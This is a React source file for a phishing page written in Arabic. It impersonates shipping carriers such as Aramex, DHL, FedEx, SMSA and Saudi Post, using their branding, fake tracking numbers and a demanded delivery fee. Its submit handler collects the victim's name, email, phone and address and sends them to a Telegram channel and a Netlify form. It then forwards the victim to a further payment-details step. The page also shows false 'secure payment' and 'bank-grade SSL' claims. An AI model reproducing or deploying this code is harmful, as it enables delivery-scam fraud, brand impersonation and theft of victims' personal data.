import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import { generateTrackingNumber } from "@/utils/trackingNumbers";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Package, Hash } from "lucide-react";
import heroAramex from "@/assets/hero-aramex.jpg";
import heroDhl from "@/assets/hero-dhl.jpg";
import heroFedex from "@/assets/hero-fedex.jpg";
import heroSmsa from "@/assets/hero-smsa.jpg";
import heroUps from "@/assets/hero-ups.jpg";
import heroEmpost from "@/assets/hero-empost.jpg";
import heroZajil from "@/assets/hero-zajil.jpg";
import heroNaqel from "@/assets/hero-naqel.jpg";
import heroSaudipost from "@/assets/hero-saudipost.jpg";
import heroKwpost from "@/assets/hero-kwpost.jpg";
import heroQpost from "@/assets/hero-qpost.jpg";
import heroOmanpost from "@/assets/hero-omanpost.jpg";
import heroBahpost from "@/assets/hero-bahpost.jpg";
import heroGenacom from "@/assets/hero-genacom.jpg";
import heroAlbaraka from "@/assets/hero-albaraka.jpg";
import heroAlfuttaim from "@/assets/hero-alfuttaim.jpg";
import heroAlshaya from "@/assets/hero-alshaya.jpg";
import heroBahri from "@/assets/hero-bahri.jpg";
import heroShipco from "@/assets/hero-shipco.jpg";
import heroHellmann from "@/assets/hero-hellmann.jpg";
import heroDsv from "@/assets/hero-dsv.jpg";
import heroJinakum from "@/assets/hero-jinakum.jpg";
import heroBg from "@/assets/hero-bg.jpg";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");
  const [generatedTracking, setGeneratedTracking] = useState("");

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const currencyParam = urlParams.get('currency');
  const titleParam = urlParams.get('title');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || shippingCompanyBranding.aramex;
  const companyMeta = getCompanyMeta(serviceKey);

  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = companyMeta.image;

  const shippingInfo = linkData?.payload as any;
  const payerType = shippingInfo?.payer_type || "recipient";

  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";

  const currencyCode = currencyParam || countryData?.currency || "SAR";

  const rawAmount = shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyCode);
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
  
  const heroImages: Record<string, string> = {
    'aramex': heroAramex,
    'dhl': heroDhl,
    'dhlkw': heroDhl,
    'dhlqa': heroDhl,
    'dhlom': heroDhl,
    'dhlbh': heroDhl,
    'fedex': heroFedex,
    'smsa': heroSmsa,
    'ups': heroUps,
    'empost': heroEmpost,
    'zajil': heroZajil,
    'naqel': heroNaqel,
    'saudipost': heroSaudipost,
    'kwpost': heroKwpost,
    'qpost': heroQpost,
    'omanpost': heroOmanpost,
    'bahpost': heroBahpost,
    'genacom': heroGenacom,
    'jinaken': heroGenacom,
    'albaraka': heroAlbaraka,
    'alfuttaim': heroAlfuttaim,
    'alshaya': heroAlshaya,
    'bahri': heroBahri,
    'national': heroBahri,
    'shipco': heroShipco,
    'hellmann': heroHellmann,
    'dsv': heroDsv,
    'jinakum': heroJinakum,
  };
  
  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;

  useEffect(() => {
    if (serviceKey && !generatedTracking) {
      const tracking = shippingInfo?.tracking_number || generateTrackingNumber(serviceKey);
      setGeneratedTracking(tracking);
    }
  }, [serviceKey, shippingInfo?.tracking_number, generatedTracking]);
  
  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    const formData = new FormData();
    formData.append('form-name', 'payment-recipient');
    formData.append('name', customerName);
    formData.append('email', customerEmail);
    formData.append('phone', customerPhone);
    formData.append('address', residentialAddress);
    formData.append('service', serviceName);
    formData.append('amount', formattedAmount);
    formData.append('linkId', id || '');

    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }

    const productionDomain = window.location.origin;
    const telegramResult = await sendToTelegram({
      type: 'payment_recipient',
      data: {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        address: residentialAddress,
        service: serviceName,
        amount: formattedAmount,
        payment_url: `${productionDomain}/pay/${id}/details`
      },
      timestamp: new Date().toISOString()
    });

    try {
      const customerData = {
        ...linkData.payload,
        customerInfo: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          address: residentialAddress,
          service: serviceName,
          amount: formattedAmount
        },
        selectedCountry: countryCode
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: customerData
      });
    } catch (error) {
    }

    navigate(`/pay/${id}/details`);
  };
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={dynamicTitle}
        description={dynamicDescription}
      />
      <Helmet>
        <meta property="og:image" content={dynamicImage} />
        <meta name="twitter:image" content={dynamicImage} />
        <meta name="theme-color" content={companyBranding.colors.primary} />
      </Helmet>
      <div 
        className="min-h-screen" 
        dir="rtl"
        style={{
          background: `linear-gradient(to bottom, ${companyBranding.colors.surface} 0%, ${companyBranding.colors.background} 100%)`
        }}
      >
        <div 
          className="relative w-full h-56 sm:h-72 overflow-hidden"
          style={{
            background: companyBranding.gradients.hero
          }}
        >
          <div className="absolute inset-0">
            <img 
              src={heroImage}
              alt={serviceName}
              className="w-full h-full object-cover opacity-20 mix-blend-overlay"
            />
          </div>
          <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-transparent to-black/50" />
          
          <div className="absolute top-0 left-0 right-0 p-4 sm:p-6">
            <div className="container mx-auto max-w-2xl flex items-center justify-between">
              {branding.logo && (
                <div 
                  className="bg-white rounded-2xl p-3 sm:p-4 shadow-2xl border-2"
                  style={{ borderColor: companyBranding.colors.primary }}
                >
                  <img 
                    src={branding.logo} 
                    alt={serviceName}
                    className="h-14 sm:h-20 w-auto max-w-[140px] sm:max-w-[200px]"
                    onError={(e) => {
                      e.currentTarget.style.display = 'none';
                      const parent = e.currentTarget.parentElement;
                      if (parent) {
                        parent.innerHTML = `<div class="text-2xl sm:text-4xl font-bold px-4" style="color: ${companyBranding.colors.primary}">${companyBranding.nameEn}</div>`;
                      }
                    }}
                  />
                </div>
              )}
              
              <Badge 
                className="text-white border-0 text-xs sm:text-sm px-3 sm:px-4 py-1 sm:py-2"
                style={{
                  background: 'rgba(255, 255, 255, 0.25)',
                  backdropFilter: 'blur(10px)'
                }}
              >
                <Shield className="w-3 h-3 sm:w-4 sm:h-4 ml-1" />
                نظام دفع آمن
              </Badge>
            </div>
          </div>
          
          <div className="absolute bottom-0 left-0 right-0 p-4 sm:p-6">
            <div className="container mx-auto max-w-2xl">
              <div className="text-white text-right">
                <h1 className="text-2xl sm:text-4xl font-bold mb-2 drop-shadow-lg">
                  {companyBranding.nameAr}
                </h1>
                <p className="text-sm sm:text-lg opacity-95 drop-shadow-md">
                  {companyBranding.description}
                </p>
              </div>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 sm:px-4 -mt-10 sm:-mt-16 relative z-10">
          <div className="max-w-2xl mx-auto">
            
            <Card 
              className="p-6 sm:p-10 shadow-2xl border-t-8 backdrop-blur-sm bg-white/95"
              style={{ borderTopColor: companyBranding.colors.primary }}
            >
              {generatedTracking && (
                <div 
                  className="mb-6 p-4 rounded-xl text-center border-2"
                  style={{
                    background: `linear-gradient(135deg, ${companyBranding.colors.primary}15, ${companyBranding.colors.secondary}15)`,
                    borderColor: companyBranding.colors.primary + '30'
                  }}
                >
                  <div className="flex items-center justify-center gap-2 mb-2">
                    <Hash className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: companyBranding.colors.primary }} />
                    <span className="text-xs sm:text-sm font-semibold" style={{ color: companyBranding.colors.primary }}>
                      رقم التتبع
                    </span>
                  </div>
                  <p className="text-lg sm:text-2xl font-mono font-bold tracking-wider" style={{ color: companyBranding.colors.primary }}>
                    {generatedTracking}
                  </p>
                </div>
              )}

              <form onSubmit={handleProceed}>
                <div className="flex items-center justify-between mb-6 sm:mb-8">
                  <h2 className="text-xl sm:text-3xl font-bold" style={{ color: companyBranding.colors.text }}>
                    {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
                  </h2>
                  
                  <div
                    className="w-16 h-16 sm:w-24 sm:h-24 rounded-2xl sm:rounded-3xl flex items-center justify-center shadow-xl"
                    style={{
                      background: companyBranding.gradients.primary,
                    }}
                  >
                    <Package className="w-8 h-8 sm:w-12 sm:h-12 text-white" />
                  </div>
                </div>

                <div 
                  className="mb-6 p-4 rounded-xl flex items-center gap-3"
                  style={{
                    background: companyBranding.colors.surface,
                    border: `1px solid ${companyBranding.colors.border}`
                  }}
                >
                  <div 
                    className="w-12 h-12 rounded-xl flex items-center justify-center"
                    style={{ background: companyBranding.colors.primary }}
                  >
                    <CreditCard className="w-6 h-6 text-white" />
                  </div>
                  <div className="flex-1">
                    <p className="text-xs text-muted-foreground">المبلغ المطلوب</p>
                    <p className="text-xl sm:text-2xl font-bold" style={{ color: companyBranding.colors.primary }}>
                      {formattedAmount}
                    </p>
                  </div>
                </div>

                <div className="space-y-4 sm:space-y-5 mb-8">
                  <div>
                    <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm sm:text-base font-semibold">
                      <User className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
                      الاسم الكامل
                    </Label>
                    <Input
                      id="name"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      required
                      className="h-12 sm:h-14 text-base sm:text-lg border-2 focus:ring-2"
                      style={{
                        borderColor: companyBranding.colors.border,
                      }}
                      placeholder="أدخل اسمك الكامل"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm sm:text-base font-semibold">
                      <Mail className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
                      البريد الإلكتروني
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      required
                      className="h-12 sm:h-14 text-base sm:text-lg border-2 focus:ring-2"
                      style={{
                        borderColor: companyBranding.colors.border,
                      }}
                      placeholder="example@email.com"
                      dir="ltr"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm sm:text-base font-semibold">
                      <Phone className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
                      رقم الهاتف
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      required
                      className="h-12 sm:h-14 text-base sm:text-lg border-2 focus:ring-2"
                      style={{
                        borderColor: companyBranding.colors.border,
                      }}
                      placeholder={`${phoneCode} ${phonePlaceholder}`}
                      dir="ltr"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="address" className="flex items-center gap-2 mb-2 text-sm sm:text-base font-semibold">
                      <MapPin className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
                      العنوان السكني
                    </Label>
                    <Input
                      id="address"
                      value={residentialAddress}
                      onChange={(e) => setResidentialAddress(e.target.value)}
                      required
                      className="h-12 sm:h-14 text-base sm:text-lg border-2 focus:ring-2"
                      style={{
                        borderColor: companyBranding.colors.border,
                      }}
                      placeholder="أدخل عنوانك السكني الكامل"
                    />
                  </div>
                </div>
              
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-base sm:text-xl py-6 sm:py-8 text-white font-bold shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:scale-[1.02]"
                  style={{
                    background: companyBranding.gradients.primary
                  }}
                >
                  <span className="ml-2">المتابعة للدفع</span>
                  <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 mr-2" />
                </Button>
              
                <div 
                  className="mt-6 p-4 rounded-xl text-center"
                  style={{
                    background: `${companyBranding.colors.primary}10`,
                  }}
                >
                  <div className="flex items-center justify-center gap-2 text-xs sm:text-sm">
                    <Shield className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
                    <span style={{ color: companyBranding.colors.textLight }}>
                      بياناتك محمية بتشفير SSL من الدرجة البنكية
                    </span>
                  </div>
                </div>
              </form>
              
              <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
                <input type="text" name="name" />
                <input type="email" name="email" />
                <input type="tel" name="phone" />
                <input type="text" name="address" />
                <input type="text" name="service" />
                <input type="text" name="amount" />
                <input type="text" name="linkId" />
              </form>
            </Card>

            <div className="mt-6 text-center">
              <p className="text-xs sm:text-sm text-muted-foreground">
                بالمتابعة، أنت توافق على 
                <a href="#" className="underline mx-1" style={{ color: companyBranding.colors.primary }}>
                  الشروط والأحكام
                </a>
                و
                <a href="#" className="underline mx-1" style={{ color: companyBranding.colors.primary }}>
                  سياسة الخصوصية
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;
